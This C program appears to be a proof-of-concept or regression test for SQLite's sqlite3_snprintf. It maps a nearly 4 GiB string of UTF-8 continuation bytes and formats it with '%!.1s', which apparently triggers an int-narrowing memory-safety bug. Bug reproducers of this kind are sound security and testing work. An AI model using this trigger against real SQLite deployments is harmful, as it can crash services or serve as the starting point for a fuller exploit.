#define _GNU_SOURCE

#include "sqlite3.h"

#include <errno.h>
#include <inttypes.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>

#ifndef MAP_ANONYMOUS
#define MAP_ANONYMOUS MAP_ANON
#endif

static int create_pattern_fd(size_t chunk_size){
  int fd = (int)syscall(SYS_memfd_create, "sqlite-utf8-precision-pattern", 0);
  if( fd < 0 ){
    perror("memfd_create");
    return -1;
  }
  if( ftruncate(fd, (off_t)chunk_size) != 0 ){
    perror("ftruncate");
    close(fd);
    return -1;
  }
  void *pattern = mmap(0, chunk_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if( pattern == MAP_FAILED ){
    perror("mmap pattern");
    close(fd);
    return -1;
  }
  memset(pattern, 0x80, chunk_size);
  if( munmap(pattern, chunk_size) != 0 ){
    perror("munmap pattern");
    close(fd);
    return -1;
  }
  return fd;
}

static char *map_repeated_pattern(int fd, size_t byte_len, size_t chunk_size){
  size_t map_len = (byte_len + chunk_size - 1) & ~(chunk_size - 1);
  char *base = mmap(0, map_len, PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  if( base == MAP_FAILED ){
    perror("reserve mmap");
    return 0;
  }
  for( size_t off = 0; off < map_len; off += chunk_size ){
    void *want = base + off;
    void *got = mmap(want, chunk_size, PROT_READ | PROT_WRITE,
                     MAP_PRIVATE | MAP_FIXED, fd, 0);
    if( got != want ){
      perror("fixed mmap");
      munmap(base, map_len);
      return 0;
    }
  }
  return base;
}

int main(void){
  const size_t chunk_size = 64ULL * 1024ULL * 1024ULL;
  const size_t n = 0x100000000ULL - 100ULL;
  char out[256];

  setvbuf(stderr, 0, _IONBF, 0);
  if( sizeof(int) != 4 || sizeof(size_t) < 8 ){
    fprintf(stderr, "unsupported ABI: sizeof(int)=%zu sizeof(size_t)=%zu\n",
            sizeof(int), sizeof(size_t));
    return 77;
  }

  int fd = create_pattern_fd(chunk_size);
  if( fd < 0 ) return 2;

  char *s = map_repeated_pattern(fd, n + 1, chunk_size);
  if( s == 0 ){
    close(fd);
    return 2;
  }
  close(fd);

  s[0] = (char)0xc0;
  s[n] = 0;

  fprintf(stderr, "mapped_len=%" PRIu64 " narrowed_to_int=%d\n",
          (uint64_t)n, (int)n);
  fprintf(stderr, "calling sqlite3_snprintf(sizeof(out), out, \"%%!.1s\", s)\n");
  sqlite3_snprintf((int)sizeof(out), out, "%!.1s", s);
  fprintf(stderr, "returned: first byte %#x\n", (unsigned char)out[0]);
  return 0;
}
